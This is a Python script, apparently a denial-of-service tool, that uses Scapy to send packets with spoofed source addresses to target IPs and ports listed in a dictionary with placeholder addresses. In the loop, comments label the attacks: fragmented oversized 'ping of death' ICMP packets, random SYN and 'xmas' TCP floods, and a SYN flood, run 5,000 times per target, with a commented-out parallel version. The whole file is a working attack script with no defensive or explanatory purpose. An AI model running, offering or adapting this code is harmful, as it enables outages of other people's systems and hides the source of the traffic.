import random
from scapy.all import *
import multiprocessing

#dictionary of {ip:port}
ip_dic = {'xxx.xxx.xxx.xxx':[21,22,23,25,...]}
#maybe add fuction to create random bytes less then 1450 bytes
data   = b'\x00'*1450



def packet_sender(info_list):
    target_ip,port_list=info_list
    #while True:
    for x in range(5000):
        spoofed = random.choice(list(ip_dic.keys()))
        dp      = random.choice(port_list)
        sp      = random.choice(ip_dic[spoofed])
        scantype=random.choice(['S','FPU'])
        ip=IP(dst=target_ip,src=spoofed,ttl=99)
        #ICMP
        #send(IP(dst=target_ip,src=spoofed)/ICMP()) #ICMP attack

        #ping of death 
        send(fragment(ip/ICMP()/('X'*60000))) #ICMP attack

        #random syn and xmas attack
        packet  = ip/TCP(dport=dp,sport=sp,flags=scantype,seq=1000)/data
        send(packet) #count=100 might add more traffic  

        #syn attack
        syn_packet=ip/TCP(dport=dp,sport=sp,flags=scantype,seq=1000,ack=1000,window=1000)/data
        send(syn_packet) #count=100 might add more traffic  
    return

#with multiprocessing.Pool(8) as pool:
#    pool.map(packet_sender,list(ip_dic.items()))

for info in ip_dic.items():
    packet_sender(info)
